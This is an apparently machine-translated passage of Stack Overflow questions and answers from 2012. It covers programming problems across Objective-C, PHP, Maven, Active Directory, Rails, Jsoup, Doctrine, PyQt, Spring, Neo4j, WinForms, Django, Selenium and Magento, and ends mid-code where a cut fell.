> **可能重复：**
> [@selector 中的参数](https://stackoverflow.com/questions/1349740/arguments-in-selector)

如何向选择器调用具有超过 2 个参数的参数化方法，例如对于 EX，我有这样的方法

```
-(void)GetTheData:(NSString *)str1 :(NSString *)str2 
```

现在我需要在@selector 内的以下计时器中调用此方法。我该如何调用？

```
NSTimer  *timer = [NSTimer scheduledTimerWithTimeInterval:0.0 target:self selector:@selector(**HowCanICallHere**) userInfo:nil repeats:YES]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:07:49.923

`NSDictionary`作为参数传递给目标方法

```
 NSDictionary *dictionary = [NSDictionary dictionaryWithObjectsAndKeys:@"1",@"parameter1",@"2",@"parameter2", nil];

        [ NSTimer scheduledTimerWithTimeInterval:0.5 target:self selector:@selector(myFunction:) userInfo: dictionary repeats:NO]; 
```

进一步检索目标函数中的参数

```
-(void)myFunction:(NSTimer *)timer{
    NSLog(@" dict : %@",timer.userInfo);
} 
```

这样你就可以通过添加更多的 keyValue 对来传递多个参数`NSDictionary`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T13:13:06.293

我不确定你能不能。出于同样的原因，我们提供了“userInfo”选项，以传递多个参数。您可以通过创建一个包含两个对象的字典来轻松实现它：

```
NSDictionary *dict = [NSDictionary dictionaryWithObjects:objArray andKeys:keyArray]; 
```

并将该字典作为 userInfo 对象传递给方法：

```
NSTimer  *timer = [NSTimer scheduledTimerWithTimeInterval:0.0 target:self selector:@selector(urTimerMethod:) userInfo:dict repeats:YES]; 
```

将方法定义为：

```
- (void)urTimerMethod:(NSTimer *)timer {
        NSDictionary *dict = [timer userInfo];
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T12:46:43.187

You can use this:

NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval:0.0 target:self selector:@selector(GetTheData::) userInfo:nil repeats:YES];

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:13:00.800

我知道如何将它与执行选择器一起使用，所以也许您可以通过以下方式进行操作：

```
-(void)GetTheData1:(NSString *)str1 GetTheData2:(NSString *)str2

NSTimer  *timer = [NSTimer scheduledTimerWithTimeInterval:0.0 target:self selector:@selector(mymethod) userInfo:nil repeats:YES];

- (void) mymethod {
[self performSelector:@selector(GetTheData1:GetTheData2:) withObject:str1 withObject:str2];

} 
```

# php - php 5.2.17 date('T') 给出了不正确的时区。服务器时间+phpinfo时间正确

> ID：13703116
> 
> 赞同：0
> 
> 时间：2012-12-04T12:39:34.863
> 
> 标签：php, timezone, centos, phpinfo

我有一个奇怪的问题：

*   日期函数给出 timezone=MST
*   centOS 提示符中的日期函数给了我 EST
*   该`phpinfo()`函数返回**America/New_York**

由于 Plesk 显示的是 America/New_York 而 centOS 没有显示，因此 Techsupport 对 `/usr/share/zoneinfo/`文件做了一些处理，因为他们说 New_York 文件以某种方式显示 MST（山地时间）。

完成该操作后，centOS 时间和`phpinfo()`EST 正确显示，但日期功能仍显示 MST。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:41:48.137

你试过了`date_default_timezone_set()`吗？

> 自 PHP 5.1.0（重写日期/时间函数时）以来，如果时区无效，每次调用日期/时间函数都会生成 E_NOTICE，如果使用系统设置或 TZ，则会生成 E_WARNING 消息环境变量。

# maven - 说在本地存储库中安装了一个 pom 是什么意思？

> ID：13703117
> 
> 赞同：0
> 
> 时间：2012-12-04T12:39:39.373
> 
> 标签：maven, pom.xml

来自[Maven: The Complete Reference](http://www.sonatype.com/books/mvnref-book/reference/pom-relationships-sect-pom-best-practice.html#pom-relationships-sect-grouping-deps)一书，第*3.6.1 节。分组依赖*它说：

> 如果您在名为 persistence-deps 的目录中创建此项目，您需要做的就是创建此 pom.xml 并运行 mvn install。由于打包类型是 pom，所以这个 POM 安装在你的本地仓库中。您现在可以将此项目添加为依赖项，其所有依赖项都将作为传递依赖项添加到您的项目中。当你声明对这个 persistence-deps 项目的依赖时，不要忘记将依赖类型指定为 pom。

说在本地存储库*中安装了一个 pom 是*什么意思？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:14:51.697

每次 Maven 需要查找依赖项时，它首先会在本地存储库中查找 - 通常位于`.m2`用户主目录中的目录中。如果在那里找不到依赖项，它会将依赖项下载到您的本地存储库中并从那里使用它。

当它说*pom 已安装在本地存储库*中时，这意味着 POM 文件已复制到本地存储库中的正确位置。然后，您在本地构建的其他项目可以解决该依赖关系并使用它。

# sharepoint - LastPwdSEt 未通过更新密码进行更新

> ID：13703122
> 
> 赞同：1
> 
> 时间：2012-12-04T12:40:01.260
> 
> 标签：sharepoint, active-directory

我喜欢计算活动目录中用户的密码到期日期

我能够获得 MaxPWdAge 和 LastPwdSet 属性。

但问题是，每当我出于测试目的更改某个用户的密码时，lastPwdSet 没有更新，它仍然显示旧日期？

谁能告诉我为什么会这样？

```
public bool CheckPassWordExpiryDate(string LdapPath, string Username, string Password)
        {
            DomainConfiguration domainConfig = new DomainConfiguration();
            // Configuration(web.config) changes
            DirectoryEntry de = new DirectoryEntry("LDAP://" + LdapPath, domainConfig.UserName, domainConfig.Password);
            DirectoryEntry entry = new DirectoryEntry();
            entry.Username = Username;
            entry.Password = Password;

            //Function to get maximum password age from the active directory
            int maxPwdAge = GetMaxPasswordAge(); 

            // Function to get last password set date for the use.
            DateTime pwdLastSet = GetPwdLastSet("pwdLastSet", Username);

            //Add maximum password age days to Last password set days , if it is less than today's date means that password has been expired else it is not expired
            if (pwdLastSet.AddDays(maxPwdAge) < DateTime.Now)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static int GetMaxPasswordAge()
        {
            DomainConfiguration domainConfig = new DomainConfiguration();
            using (new SPMonitoredScope("AD Properties"))
            {
                using (DirectoryEntry domain = new DirectoryEntry("LDAP://" + domainConfig.DomainName, domainConfig.UserName, domainConfig.Password))
                {
                    DirectorySearcher ds = new DirectorySearcher(
                        domain,
                        "(objectClass=*)",
                        null,
                        SearchScope.Base
                        );

                    SearchResult sr = ds.FindOne();
                    TimeSpan maxPwdAge = TimeSpan.MinValue;
                    if (sr.Properties.Contains("maxPwdAge"))
                        maxPwdAge = TimeSpan.FromTicks((long)sr.Properties["maxPwdAge"][0]);
                    return maxPwdAge.Duration().Days;
                }
            }
        }
        public DateTime GetPwdLastSet(string attr, string UserName)
        {

            DomainConfiguration domainConfig = new DomainConfiguration();
            using (new SPMonitoredScope("AD Properties"))
            {
                using (DirectoryEntry domain = new DirectoryEntry("LDAP://" + domainConfig.DomainName, domainConfig.UserName, domainConfig.Password))
                {
                    //DirectorySearcher searcher = new DirectorySearcher(domain, "(|(objectClass=organizationalUnit)(objectClass=container)(objectClass=builtinDomain)(objectClass=domainDNS))");
                    DirectorySearcher searcher = new DirectorySearcher(domain);
                    searcher.PageSize = 1000;
                    searcher.Filter = "(SAMAccountName='" + UserName + "')";
                    searcher.Filter = "(|(objectCategory=group)(objectCategory=person))";
                    var user = searcher.FindOne();
                    DateTime pwdLastSet = DateTime.FromFileTime((Int64)user.Properties["PwdLastSet"][0]);
                    return pwdLastSet;
                }
            }
        }
    } } 
```

# ruby-on-rails - Rails 3 中的 HABTM 关联

> ID：13703126
> 
> 赞同：0
> 
> 时间：2012-12-04T12:40:18.910
> 
> 标签：ruby-on-rails

我有两个模型用户和项目

用户 -> has_many :projects ,:dependent=>:destroy

项目 -> has_and_belongs_to_many :users

我还创建了一个映射表 projects_users。

当我尝试删除用户时，其相应的项目并未从项目表中删除，并且映射表也显示相同的数据而没有更改，唯一发生的是我的用户数据正在删除。

有什么方法可以删除关联数据，并从映射表中删除条目。

项目模型

```
class Project < ActiveRecord::Base
  attr_accessible :name ,:user_ids
  has_and_belongs_to_many :users
end 
```

用户模型

```
class User < ActiveRecord::Base
  attr_accessible :name
  has_many :projects 
end 
```

关联表

```
class ProjectsUsers < ActiveRecord::Migration
  def up
    create_table :projects_users, :id => false do |t|

        t.references :project
        t.references :user
    end
  end

  def down
    drop_table :projects_users
  end
end 
```

用户：_form.html.erb

```
<%= semantic_form_for @user  do |f| %>
    <%= f.inputs do %>
     <%= f.input :name %>
     <% end %>
    <%= f.actions %>
  <% end %> 
```

项目：_form.html.erb

```
<%= semantic_form_for @project  do |f| %>
    <%= f.inputs do %>
     <%= f.input :name %>
     <%= f.input :users, :as => :check_boxes %>
    <% end %>
    <%= f.actions %>
  <% end %> 
```

提前致谢。

# html - Jsoup如何选择具有多个属性的标签

> ID：13703127
> 
> 赞同：13
> 
> 时间：2012-12-04T12:40:18.007
> 
> 标签：html, parsing, jsoup

我有一个表格标签

```
<table width="100%" align="center"/> 
```

到目前为止，Jsoup 提供

```
Document document =Jsoup.parse(htmlString);
document.select("table[width=100%],table[align=center]"); 
```

这是 OR 组合，即如果任何一个匹配，则填充元素。为了选择宽度 = 100% 和对齐 = 中心的表格，我已经完成了以下操作

```
Elements element =document.select("table[align=center]");
element =element.select("table[width=100%]"); 
```

所以我要问的是，就像这个 OR 组合

```
document.select("table[width=100%],table[align=center]"); 
```

是否有任何 AND 组合选择器，即宽度 = 100% 且对齐 = 中心的表格。提前致谢

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-12-11T11:05:34.750

您可以通过向选择器添加更多术语来实现一个查询的 AND。在这种情况下：

```
Elements tables = document.select("table[width=100%][align=center]"); 
```

作品。

您可以继续添加更多术语以使其尽可能精确，例如`table[width=100%][align=center]:contains(text)`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-04T17:52:25.907

目前（Jsoup 1.7.1）没有可用的选择器*AND*。但是你可以用两个来做到这一点`select()`（比如你的例子#2）：

```
Elements tables = document.select("table[width=100%]").select("table[align=center]"); 
```

您还可以发布功能请求：[https ://github.com/jhy/jsoup/issues](https://github.com/jhy/jsoup/issues)

# symfony - Doctrine2：使用查询构建器进行多对多关系

> ID：13703131
> 
> 赞同：0
> 
> 时间：2012-12-04T12:40:27.947
> 
> 标签：symfony, doctrine-orm, repository, query-builder

为了在系统中搜索人员，我在存储库中编写了一个函数。此函数接收具有字段名称和条件的数组，并使用查询构建器来制定有效的 DQL 语句。

一切正常，直到我想制定一个搜索规则，例如：

“找到所有属于某个领域的人。”

... Person 和 Domain 实体具有多对多关系。

根据 Symfony2 的说法，这种关系是正确定义的，实际上一切都在 Twig 模板和控制器中工作。

该函数如下所示：-

```
private function query($extra_conditions = null)
{

    $qb = $this->_em->createQueryBuilder();
    $query =
    $qb->select('p')
    ->from('AppMainBundle:Person', 'p')
    ->leftjoin('AppMainBundle:Domain', 'd')
    ->where("p.firstname IS NOT NULL")
    ->andWhere("p.lastname IS NOT NULL")
    ->andWhere("p.function IS NOT NULL");

    if ($extra_conditions!=null)
    {
        foreach ($extra_conditions as $condition)
        {
            #filter on firstname
                if (key($condition)=='firstname')
                    $query = $query->andWhere('p.firstname LIKE ?1')
                    ->setParameter(1, $condition['firstname']);
            #filter on lastname
                if (key($condition)=='lastname')
                    $query = $query->andWhere('p.lastname LIKE ?1')
                    ->setParameter(1, $condition['lastname']);
            #filter on gender
                if (key($condition)=='gender')
                    $query = $query->andWhere('p.gender = '.$condition['gender']);
            #filter on domain(s)
                if (key($condition)=='domains')
                    $query = $query->andWhere('d.id IN ('.$condition['domains'].')');
            #filter on town
                if (key($condition)=='town')
                    $query = $query->andWhere('p.town LIKE ?1')
                    ->setParameter(1, $condition['town']);
        }
    }

    $query = $query->orderBy("p.lastname", "ASC");

    $query = $qb->getQuery();
    return $query->getResult();
} 
```

没有错误，但是将任何域作为搜索条件给出；找到并返回所有域的人。

域以数组形式提供，如 (2, 4)。

我可以进行哪些更改才能找到属于某些域的人？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T09:44:19.293

经过反复试验，我找到了两个可能的答案：

**1)**显然，在查询构建器中，您可以引用存在于连接表中的字段，而这些字段实际上并不是实体的一部分。因此，一种解决方案是：

```
#filter on domain(s)
    if (key($condition)=='domains')
        $query = $query->andWhere('p.domain_id IN ('.$condition['domains'].')'); 
```

... domain_id 位于由 Symfony2 创建的连接表“person_domain”中。

**2)**现在不再需要内部连接。也可以使用内部连接，但是它以错误的方式编写并且无论如何都不会起作用。它应该写成：

```
->leftjoin('p:domain', 'd', 'ON p.id = d.id') 
```

希望其他人可以从上述中受益。

# java - 声明场外/内方法：声纳奇异场规则

> ID：13703134
> 
> 赞同：3
> 
> 时间：2012-12-04T12:40:36.120
> 
> 标签：java, sonarqube

声纳让我违反了“奇异场”的规则。

我只用这样一种方法上课。

```
public class MyClass{

   MyType object;   

   public void myMethod(){
         object= aMethod(arg);  //Returns instance for the class MyType 
   }

} 
```

这里**myMethod**被无数次调用。

1.  我是否节省了为**MyType**创建对象的成本？

2.  Sonar 告诉我在**myMethod** ()中声明**MyType 。**这会导致创建对象的成本吗？

 **请任何解释....

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-04T13:39:12.930

在您的实际代码中，严格不需要声明`object`为字段。

实际上，它甚至永远不需要被另一个对象部分访问，因此它的状态没有理由在整个程序工作流程中被保存（浪费一点内存......）。

因此，垃圾收集器可以在`myMethod()`完成后立即收集您的局部变量。

Sonar 希望您声明如下：

```
public class MyClass{  

   public void myMethod(){
      MyType object = aMethod(arg);  //local variable instead of field ;)
   }

} 
```**

# iphone - 正确显示单个图像

> ID：13703135
> 
> 赞同：0
> 
> 时间：2012-12-04T12:40:37.073
> 
> 标签：iphone, objective-c, ios, uiimageview

我使用 AQgridview 来显示一个 facebook 相册，每次按下其中一个时，都会在整个屏幕上切换到带有该图像的视图。

问题是我似乎无法正确显示它，它看起来质量很差。首先，无论原始尺寸如何，我都尝试在整个屏幕上拉伸它，它看起来很糟糕，现在我编写了一些代码来保持原始宽高比作为原始图片，但仍然没有雪茄，有什么帮助吗？

```
if ([[UIDevice currentDevice] orientation] == UIDeviceOrientationPortrait)
{
    if (width<=320 && height<=480)
    {
        [self.photo setFrame:CGRectMake(0, 0, width,height)];
    }
    else if (320/width <= 480/height)
    {
        double number = (double) height*320/width;
        NSLog(@"work: %f", number);
        [self.photo setFrame:CGRectMake(0, 0, 320,number)];
    }
    else if (480/height < 320/width)
    {
        double number = (double) width*480/height;
        NSLog(@"work: %f", number);
         [self.photo setFrame:CGRectMake(0, 0, 480/height*width,480)];
    }
    [self.photo setImageWithURL:self.photoURL]; 
```

你知道什么问题吗？或者，任何人都可以提供准备正确显示图像的课程吗？我听说过很多照片库现成的课程，但似乎没有一个支持 arc

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T16:10:21.547

我发现我从 facebook 导入了劣质图片，这就是质量问题。调整大小的算法工作正常。

# python - 如何在 QMenu 中隐藏子菜单

> ID：13703136
> 
> 赞同：10
> 
> 时间：2012-12-04T12:40:37.523
> 
> 标签：python, hide, pyqt4, submenu

我有一个生成菜单项的应用程序，我想设置特定子菜单的可见性。

我尝试使用`setVisibility(False)`，但这不起作用。 `setVisibility()`适用于菜单项，但不适用于 QMenus 中的子菜单。

看看下面的代码片段：

```
import sys
from PyQt4 import QtGui

class Window(QtGui.QWidget):
    def __init__(self, parent=None):
        super(Window, self).__init__(parent)
        self.menu = QtGui.QMenu()
        self.actio1 = QtGui.QAction('One', self)
        self.actio2 = QtGui.QAction('Two', self)
        self.menu.addAction(self.actio1)
        self.menu.addAction(self.actio2)
        self.actio1.setVisible(False)
        self.submenu = QtGui.QMenu('submenu', self)
        self.submenu.addAction('sub one')
        self.submenu.addAction('sub two')
        self.menu.addMenu(self.submenu)        
        self.submenu2 = QtGui.QMenu('submenu 2', self)
        self.submenu2.addAction('sub 2 one')
        self.submenu2.addAction('sub 2 two')
        self.menu.addMenu(self.submenu2)        
        self.submenu2.setVisible(False)
        layout = QtGui.QHBoxLayout()
        layout.addWidget(self.menu)
        self.setLayout(layout)

if __name__ == '__main__':

    app = QtGui.QApplication(sys.argv)
    w = Window()
    w.show()
    sys.exit(app.exec_()) 
```

在上面的例子中，我可以隐藏名为“One”的菜单项，但不能隐藏名为“submenu 2”的子菜单

谁能给我一个想法...

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-12-04T12:49:16.550

你几乎拥有它；

而不是这个：

```
self.submenu2.setVisible(False) 
```

你要这个：

```
self.submenu2.menuAction().setVisible(False) 
```

# ruby-on-rails-3 - 在控制器中搜索多个条目（哈希值）

> ID：13703138
> 
> 赞同：0
> 
> 时间：2012-12-04T12:40:42.703
> 
> 标签：ruby-on-rails-3, hash

这是我正在尝试做的事情：

我有三张桌子：

约会用户和共享 - 我想将用户分配给约会。所以到目前为止我所做的是我在约会和用户之间创建了一个表，其中存储了用户分配给的 user_id 和约会 ID。我可以在我的约会控制器中搜索特定约会的股票

```
@shares = Shares.find(:all, :conditions => { :appointment_id => @appointment.id }) 
```

之后，我得到一个哈希 @shares，如下所示：

```
[#<Shares id: 10, user_id: 3, appointment_id: 1, created_at: "2012-12-04 10:24:16", updated_at: "2012-12-04 10:24:17">, #<Shares id: 12, user_id: 2, appointment_id: 1, created_at: "2012-12-04 10:28:38", updated_at: "2012-12-04 10:28:39">] 
```

我现在想做的是在 users 表中查询，以查找属于我在共享哈希中找到的 user_ids 的用户名。我尝试过这样的事情：

```
@shares.each do |s|
@participants = User.all(:conditions => {:id => s.user_id})
end 
```

但它不起作用，因为每次循环开始时参与者哈希都会被覆盖......感谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:50:29.940

```
@shares = Shares.find(:all, :conditions => { :appointment_id => @appointment.id })
@participants = User.all(:conditions => ["id IN (?)", @shares.map{|s| s.user_id}.compact]) 
```

# objective-c - 试图检测抖动，从不调用motionEnded

> ID：13703140
> 
> 赞同：1
> 
> 时间：2012-12-04T12:40:44.073
> 
> 标签：objective-c, ios, shake, motion-detection

我正在尝试检测 iOS6 中的震动，似乎每个示例都是在 2009 年左右为 iOS3 编写的，并且没有任何工作正常。这是我的方法：

```
- (void) motionEnded: (UIEventSubtype) motion withEvent: (UIEvent *) event {
    if (motion == UIEventSubtypeMotionShake) NSLog(@"Detected a shake");
} 
```

我已经尝试了 Apple 的建议（创建一个`canBecomeFirstResponder`返回的方法`YES`并调用它），但它什么也没做。它被称为罚款，但对无法识别的抖动没有影响。

我已经阅读了一些关于需要创建我的视图的自定义版本的内容，但我真的不想搞砸，因为我没有以编程方式创建视图，并且有四个左右。

提前致谢！

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-04T13:18:39.017

在您的 viewController 中，您必须覆盖方法 caneBecomeFirstResponder 并回答是，在 viewDidAppear 中您必须将您的 viewController (self) 设置为第一响应者。这是代码：

```
-(void)motionEnded:(UIEventSubtype)motion withEvent:(UIEvent *)event {
    if (motion == UIEventSubtypeMotionShake) NSLog(@"Detected a shake");
}

-(BOOL)canBecomeFirstResponder {
    return YES;
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];

    [self becomeFirstResponder];
} 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-12-04T14:49:56.780

结果我需要 viewDidAppear，而不是 viewDidLoad。不知道为什么。

# java - Spring Transaction 在选择查询后尝试触发更新

> ID：13703142
> 
> 赞同：2
> 
> 时间：2012-12-04T12:40:46.690
> 
> 标签：java, spring, hibernate, transactions, spring-transactions

我有一个执行简单选择查询的 DAO 方法：

```
@Transactional
public List<Object[]> getMyTableData(Long someId)
{
    Session session = (Session) getEntityManager().getDelegate();

    return session
        .createSQLQuery("SELECT * FROM my_table where some_id = :someId")
        .addEntity(MyTable.class)
        .setParameter("someId", someId)
        .list();
} 
```

当我运行它时，我在日志中发现了两个查询：

1.  成功获得结果的“select * from MyTable where some_id = ...”查询
2.  之后我在我的日志中找到了这个：

    org.springframework.orm.jpa.JpaTransactionManager：启动事务提交 org.springframework.orm.jpa.JpaTransactionManager：在EntityManager [org.hibernate.ejb.EntityManagerImpl@162add4]上提交JPA事务 org.hibernate.transaction.JDBCTransaction：提交org. hibernate.event.def.AbstractFlushingEventListener：处理刷新时间级联 org.hibernate.event.def.AbstractFlushingEventListener：刷新：0 次插入，1 次更新，0 次删除到 2 个对象

然后它触发另一个查询“Update my_table set ....”

为什么要执行此更新查询？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:18:55.013

正如 Pace 上面提到的“在 JPA 中，当事务提交时，JPA 会将任何修改后的实体写入数据库”。所以我尝试添加`readOnly = true`到`@Transactional`注释中，它解决了这个问题。

# ruby-on-rails - 在 Neo4j 数据库中获取三阶连接时如何提高性能？

> ID：13703153
> 
> 赞同：1
> 
> 时间：2012-12-04T12:41:19.287
> 
> 标签：ruby-on-rails, performance, graph, neo4j, cypher

我正在使用 neo4j 数据库来跟踪人与人之间的联系。我需要跟踪三阶连接（类似于linkedin 的做法），但我遇到了一些性能问题。在我的测试数据库中，我有大约 3000 个用户，有 3 到 8 个第一顺序连接（联系人）。在获取二阶连接时，性能似乎一切都很好。但是获取三阶连接需要很长时间。我使用 CYPHER 查询来获取数据。只有配置文件 ID 和它们之间的连接存储在数据库中。

这是查询本身：

```
THIRD_ORDER_CONNECTIONS = <<-CYPHER
  START n=node:profile(id='%{id}')
  MATCH n-[:contacts]-common_contact_1-[:contacts]-common_contact_2-[:contacts]-profile
  WHERE common_contact.id <> %{exclude_id} AND common_contact_1.id <> common_contact_2.id
  RETURN COLLECT(DISTINCT profile.id)
CYPHER 
```

在我的本地机器上需要 48 秒。所以问题是 - 我如何提高性能或更改查询以在适当的时间获得三阶连接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T22:23:43.707

您是否尝试过使用 neo4j 版本 1.9.M01？对于像这样的直截了当的模式，Cypher 的性能得到了改进，这可能会产生巨大的影响，它将更多的工作分担给遍历框架。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-05T01:55:42.340

您的查询无效：`common_contact.id`无法解析为标识符

*   你得到多少结果？
*   如果您在查询中添加方向，查询时间会如何变化`-->`？
*   请使用参数而不是 ruby​​ 替换。
*   尝试`RETURN profile.id`（不同需要将所有内容保存在内存中以进行唯一过滤）
*   通常 cypher 负责唯一性，因此`common_contact_1.id <> common_contact_2.id`可能没有必要

# c# - 从另一个表单访问表单中的内容的最佳方式是什么？C＃

> ID：13703155
> 
> 赞同：1
> 
> 时间：2012-12-04T12:41:22.967
> 
> 标签：c#, forms

我只是想知道。如果我有两个表格..表格 1 和表格 2，您需要访问文本框、标签等..例如使其可见或更改其文本..

从 Form2 访问这些的最佳方式是什么？

在 Form 1 中创建一个方法，如：

```
public void setTextBoxVisible(){
     textBox1.Visible = true;
} 
```

或在表格 1 中创建访问器，并从表格 2 更改可见性，例如：

在表格 2 中：

```
public TextBox TextBox1 {
    get { return textBox1; }
} 
```

在表格 1 中：

```
Form1 form1 = new Form1();
form1.TextBox1.Visible = true; 
```

我知道这可能是一个愚蠢的问题，但我还是编程新手，我想知道我能做这些事情的最佳方法。谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T12:43:47.127

在您的第二个场景中，您声明只读属性，而在第一种方法中，您通过`public`函数公开功能，IMO 是更清晰和更好的方法。

编辑：我在您的第一种方法中看到的一个问题是您无法阻止用户更改 Visible 以外的某些属性。用户（开发人员）也可能错误地设置了 TextBox 的 Text 属性。例如

```
form1.TextBox1.Text = "Some new text"; 
```

以上不是期望的行为。*（您只想设置 Visible 属性）*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T12:45:08.883

我认为是程序员的偏好.. 我总是更喜欢方法 1，因为出错的空间更小，如果你想改变它在很多情况下的作用，那么它可以在一行代码中完成

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-04T12:48:22.057

选项 1 肯定更好，因为您只暴露了您想要暴露的部分。
您不仅减少了部分调用者的错误空间，而且还说明了方法的意图。

在选项 2 中，控件的所有方面都是可访问的，并且可以从外部代码更改，而不仅仅是`Visible`属性。

如果它更适合您的偏好，您可以创建一个属性：

```
public bool TextBox1Visible
{
    get { return TextBox1.Visible; }
    set { TextBox1.Visible = value; }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T12:48:58.073

将数据模型用作单独的类。使用观察者/MVVM 模式在数据模型发生更改时获得通知。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T12:54:07.170

我假设您在 Form2 中有一些动作触发了对 Form 1 的更改。鉴于您的选择，我会得到 1。另一个选择是考虑事件。Form1 订阅 Form2 上的事件。当它被触发时，您可以将任何您想要的内容传递给 Form1，并让它执行您想要的任何更新或更改。

# django - GAE 中的 Django send_mail()

> ID：13703156
> 
> 赞同：1
> 
> 时间：2012-12-04T12:41:29.037
> 
> 标签：django, google-app-engine

我希望登录用户能够发送他们创建的已保存在数据库中的模型对象的副本。我正在使用 get(pk=id) 来识别用户想要发送的特定内容。问题是，send_mail() 无法识别收件人电子邮件 (to)。

```
 @login_required
    def email_query(request, id):
        history = Carloan_form.objects.get(pk=id)
        subject = 'Nigerian Loan Calculator Query e-mail'
        from_email = 'xxxx@gmail.com'
        email = request.user.email
        to = "email"
        send_mail(subject,get_template('carloan/loancalc-query.txt').render(Context({'history':history})),\
                 from_email,[to], fail_silently=False)
        return HttpResponse('sent') 
```

# 更新

```
@login_required
def email_query(request, id):
    history = Carloan_form.objects.get(pk=id)
    subject = 'Nigerian Loan Calculator Query e-mail'
    from_email = 'ajibike.ca@gmail.com'
    email = request.user.email
    send_mail(subject,get_template('carloan/loancalc-query.txt').render(Context({'history':history})),\
             from_email,[email,], fail_silently=False)
    return HttpResponse('/history_query_sent/') 
```

刚刚决定将电子邮件直接传递到 send_mail() 并且它起作用了。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:57:42.880

因为您已设置`to`为 string `"email"`。我怀疑那是你想要做的。

为什么不将`email`变量直接传递给`send_mail`调用？

# selenium - 无法在 selenium webdriver 中启动 IE 浏览器

> ID：13703159
> 
> 赞同：0
> 
> 时间：2012-12-04T12:41:31.977
> 
> 标签：selenium

下面是我启动 IE 浏览器和[http://google.co.in](http://google.co.in)页面的代码。

```
 File file = new File("C:/IEDriverServer/IEDriverServer.exe");
    System.setProperty("webdriver.ie.driver", file.getAbsolutePath());
    driver = new InternetExplorerDriver();
    baseUrl = "https://myruat.corp.webex.com/US/buy/signup.html";
    driver.manage().timeouts().implicitlyWait(120, TimeUnit.SECONDS); 
```

我收到以下错误：
4235 [main] INFO org.apache.http.impl.client.DefaultHttpClient - 处理请求时捕获的 I/O 异常（org.apache.http.NoHttpResponseException）：目标服务器未能响应
4235 [ main] INFO org.apache.http.impl.client.DefaultHttpClient - 重试请求

**请让我知道如何纠正。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-23T08:20:01.320

您是否在路径环境变量中设置了 InternetExplorerDriver？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-31T12:06:20.663

```
 System.setProperty("webdriver.ie.driver", "D:\\ImportantSeleniumTools\\IEDriverServer.exe");
    WebDriver driver=new InternetExplorerDriver(); 
```

在 System.setProperty 中给出保存 InternetExplorer 服务器文件的位置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-06T09:36:36.243

用这个...

```
// Simply give the path in the setProperty

System.setProperty("webdriver.ie.driver", "absolute_path");

//(absolute_path = Full path to the exe file of Internet Explorer)

// Ex : System.setProperty("webdriver.ie.driver", "C:\ \testing\ \IEDriver.exe");

// Use double slash instead of single slash.

WebDriver driver = new InternetExplorerDriver(); 
```

# magento - Magento - 向自定义页面添加分层导航

> ID：13703163
> 
> 赞同：1
> 
> 时间：2012-12-04T12:41:41.020
> 
> 标签：magento

我正在开发一个 magento 模块，该模块在新的控制器和名称下显示特定的产品集合。

其中一些集合变得很大，所以我想在页面的一侧添加分层导航。（嘿，在我们进行分页和排序时。）

我可以添加分层导航块

```
 <reference name="left">
           <block type="catalog/layer_view" name="catalog.leftnav" template="landing/layer.phtml"/>
        </reference> 
```

我得到的是应用于整个目录的分层导航，类别被破坏，并且没有与页面产品集合的接口。

我将如何将分层导航（以及嘿，分页和排序）连接到这个自定义产品集合？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-16T12:06:10.760

这里没有答案，我改变了方向，从未完成过这条发展道路。我想我会发布我学到的东西。

上面的方法是合理的。这项工作基本上需要在目录或目录搜索模块上重新创建功能。您必须对目录的模型和块进行子类化，修改产品集合和当前类别。

这篇文章模糊地朝着正确的方向前进，但没有到达那里。
[http://www.webdesign-gm.co.uk/news/layered-navigation-on-home-page-or-any-cms-page-magento.php](http://www.webdesign-gm.co.uk/news/layered-navigation-on-home-page-or-any-cms-page-magento.php) 如果您在这方面取得了更多进展，请随时发布。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-04T09:47:56.473

我收到了来自客户的类似请求，要求在大型菜单下包含特定的可过滤属性。使用静态块，我已将此行添加到我需要特定类别的属性列表的任何地方

```
{{block type="core/template" attribute_code="age_specific" category_id="12"  template="megamenu-custom-filter-list.phtml"}} 
```

然后是“megamenu-custom-filter-list.phtml”

```
<?php if($this->getCategoryId() && is_numeric($this->getCategoryId()) && $this->getAttributeCode()): ?>
 <?php
  $visible_items = 12;
  $category = Mage::getModel('catalog/category')->load($this->getCategoryId());
  $attrCode = $this->getAttributeCode();
  unset($layer);
  $layer = Mage::getModel("catalog/layer");
  $layer->setCurrentCategory($category);
  $attributes = $layer->getFilterableAttributes();
  foreach ($attributes as $attribute):
    if($attribute->getAttributeCode() != $attrCode){
      continue;
    }
    if ($attribute->getAttributeCode() == 'price') {
      $filterBlockName = 'catalog/layer_filter_price';
